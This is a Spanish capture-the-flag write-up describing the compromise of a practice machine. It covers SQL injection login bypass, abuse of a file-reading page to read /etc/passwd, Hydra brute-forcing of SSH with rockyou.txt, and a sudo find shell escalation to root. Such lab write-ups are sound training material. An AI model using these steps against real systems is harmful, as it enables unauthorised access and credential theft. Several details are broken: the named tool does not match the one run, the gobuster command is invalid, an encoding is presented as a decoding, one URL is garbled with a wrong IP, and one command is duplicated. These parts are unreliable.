# Writeup CTF: Máquina Bocata Calamares

Este es el informe detallado paso a paso para la explotación de la máquina de práctica **AFN**, donde se abordan vulnerabilidades de inyección SQL (SQLi), lectura de archivos del sistema (LFI), ataque de fuerza bruta a SSH y escalada de privilegios mediante malas configuraciones de `sudo`.

---

## 1. Fase de Enumeración y Reconocimiento

### Escaneo de Puertos (Nmap)
Se inicia con un escaneo básico de red para identificar los puertos y servicios abiertos en el objetivo (`192.168.40.8`):

```bash
nmap -sV -sC -p- 192.168.40.8
```

**Resultados obtenidos:**
*   **Puerto 22/tcp:** SSH activo (OpenSSH 9.6p1 sobre Ubuntu Linux). Soporta autenticación por contraseña.
*   **Puerto 80/tcp:** Servidor web HTTP activo (Nginx 1.24.0). Título de la web: `AFN`.

---

## 2. Enumeración Web (Puerto 80)

Al explorar el sitio web, se identifica que las siglas **AFN** corresponden a *"ALL FAKE NEWS"*. La página principal contiene 3 artículos, donde el único enlace funcional e interesante apunta a `/sqli.php`, un apartado con fines educativos que explica conceptualmente las vulnerabilidades de inyección SQL.

### Fuzzing de Directorios
Se ejecuta `dirsearch` para descubrir rutas ocultas dentro del servidor web:

```bash
gobuster http://192.168.40.8
```

**Rutas críticas descubiertas:**
*   `/login.php` (Panel de inicio de sesión indicado como "en desarrollo").
*   `/admin.php` (Página vacía, solo cabeceras HTML).
*   `/images/` (Directorio de recursos expuesto con código 403).

---

## 3. Fase de Explotación

### Inyección SQL en `login.php`
Se comprueba el panel de login en `/login.php`. Al introducir una comilla simple (`'`) en el campo de contraseña, la aplicación web refleja un comportamiento vulnerable a SQLi.

Se utiliza un bypass clásico en el parámetro de la contraseña para romper la lógica de la consulta interna:
*   **Usuario:** `admin`
*   **Contraseña:** `' OR '1'='1`

**Lógica de la consulta vulnerable ejecutada en el servidor:**
```sql
SELECT * FROM usuarios WHERE usuario = 'admin' AND contraseña = '' OR '1'='1';
```
Dado que la condición `'1'='1'` siempre es verdadera, la autenticación se procesa con éxito y el servidor redirige a la sección privada `/admin.php`, que contiene una lista de tareas pendientes (`todo-list.php`).

### Inclusión de Archivos Locales (LFI) via Base64
Dentro de las notas del administrador, se encuentra una cadena codificada en Base64. Al decodificarla:

```bash
echo 'lee_archivos' | base64
# Resultado: bGVlX2FyY2hpdm9zCg==
```

Al navegar a `http://192.168.66bGVlX2FyY2hpdm9zCg==.php`, encontramos una herramienta interna diseñada para buscar y leer archivos en el servidor utilizando la función nativa de PHP `file_get_contents()`.

```php
$archivo = $_POST['archivo'];
$contenido = file_get_contents($archivo);
echo "<pre>" . htmlspecialchars($contenido) . "</pre>";
```

Al revisar el código fuente de esta página, se detectan dos comentarios comprometedores de los desarrolladores:
1. Advierte sobre la falta de restricciones para leer archivos del sistema.
2. Menciona la existencia de un servicio SSH expuesto a ataques de fuerza bruta si se descubriesen los nombres de usuario del sistema.

Utilizando este parámetro, se realiza la lectura exitosa del archivo `/etc/passwd` para recolectar los usuarios reales del sistema operativo:

```text
root:x:0:0:root:/root:/bin/bash
...
tyuiop:x:1000:1000:tyuiop:/home/tyuiop:/bin/bash
superadministrator:x:1001:1001:,,,:/home/superadministrator:/bin/bash
```

---

## 4. Movimiento Lateral (Fuerza Bruta SSH)

Con los nombres de usuario extraídos (`tyuiop` y `superadministrator`), se genera un diccionario personalizado llamado `users.txt` y se procede a realizar un ataque de fuerza bruta contra el servicio SSH utilizando `Hydra` junto al diccionario clásico `rockyou.txt`:

```bash
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt -u -V -f -I ssh://192.168.40.8
```

**Credenciales válidas encontradas:**
*   **Usuario:** `superadministrator`
*   **Contraseña:** `princesa`

Se establece la conexión remota legítima hacia la máquina:
```bash
ssh superadministrator@192.168.40.8
```

---

## 5. Escalada de Privilegios (Root)

Una vez dentro del sistema con la cuenta de `superadministrator`, se listan los privilegios de ejecución de comandos como superusuario:

```bash
sudo -l
```
Se identifica una mala configuración crítica en las políticas de Sudoers:
```text
(ALL) NOPASSWD: /usr/bin/find
```
El usuario actual puede ejecutar el binario `/usr/bin/find` con los máximos privilegios sin necesidad de proporcionar contraseña.

### Explotación del Binario `find`
Haciendo uso de la capacidad de `find` para ejecutar comandos del sistema mediante su parámetro `-exec`, se fuerza la llamada a una shell interactiva `/bin/sh` invocada directamente por el usuario `root`:

```bash
sudo find . -exec /bin/sh \; -quit
```

### Post-Explotación y Flags
Al consolidar la shell, se verifican la identidad del usuario actual y los archivos clave del sistema:

```bash
# whoami
root

# whoami
root

# ls
flag.txt  recordatorio.txt
```

¡Máquina comprometida al 100%! 🏁
